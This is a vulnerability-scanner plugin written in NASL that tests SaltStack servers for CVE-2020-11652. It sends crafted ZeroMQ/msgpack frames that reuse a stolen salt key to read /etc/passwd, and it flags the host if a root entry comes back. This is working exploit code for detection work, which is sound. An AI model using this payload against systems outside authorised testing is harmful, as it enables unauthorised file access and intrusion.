include("compat.inc");

if (description)
{
  script_id(51799245);
  script_version("1.3");
  script_cve_id("CVE-2020-11652");
  script_cvs_date("Date: 2020/04/30");
  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_name(english:"Saltstack authentication bypass/remote code execution");
  script_summary(english:"Saltstack authentication bypass/remote code execution");
  script_set_attribute(attribute:"description", value:"An issue was discovered in SaltStack Salt before 2019.2.4 and 3000 before 3000.2. The salt-master process ClearFuncs class allows access to some methods that improperly sanitize paths. These methods allow arbitrary directory access to authenticated users.");
  script_set_attribute(attribute:"solution", value:"At present, the manufacturer has released an upgrade patch to fix the vulnerability, and the patch acquisition link:https://docs.saltstack.com/en/latest/topics/releases/2019.2.4.html");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"plugin_publication_date", value: "2020/02/20");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"asset_inventory", value:"True");
  script_end_attributes();
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_dependencies("saltstack_CVE_2020_11651.nasl");
  script_require_ports("Services/saltstack", 4505, 4506);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");


port = get_kb_item("Services/saltstack");
if (!port) exit(0);
if (!get_tcp_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);

key = get_kb_item("salt_key");
if (!key) exit(0);

data = "010000a082a3656e63a5636c656172a46c6f616485a36b6579da00"+key+"a3636d64a5776865656ca366756eaf66696c655f726f6f74732e72656164a470617468ab2f6574632f706173737764a773616c74656e76a462617365";
strreq = hex2raw(s:data);

strreq1 = raw_string(0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x7f);

strreq2 = raw_string(0x03, 0x00, 0x4e, 0x55, 0x4c, 0x4c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00);

strreq3 = raw_string(0x04, 0x26, 0x05, 0x52, 0x45, 0x41, 0x44, 0x59, 0x0b, 0x53, 0x6f, 0x63, 0x6b, 0x65, 0x74, 0x2d,
0x54, 0x79, 0x70, 0x65, 0x00, 0x00, 0x00, 0x03, 0x52, 0x45, 0x51, 0x08, 0x49, 0x64, 0x65, 0x6e,
0x74, 0x69, 0x74, 0x79, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x1a, 0x82, 0xa4, 0x6c, 0x6f,
0x61, 0x64, 0x81, 0xa3, 0x63, 0x6d, 0x64, 0xa4, 0x70, 0x69, 0x6e, 0x67, 0xa3, 0x65, 0x6e, 0x63,
0xa5, 0x63, 0x6c, 0x65, 0x61, 0x72);

send(socket:soc, data:strreq1);
send(socket:soc, data:strreq2);
send(socket:soc, data:strreq3);
send(socket:soc, data:strreq);
sleep(1);

res_1 = recv(socket:soc, length:4096);
if ("root:x:0:0:" >< res_1)
{
	security_hole(port:port,data:res_1);
}
close(soc);
exit(0);
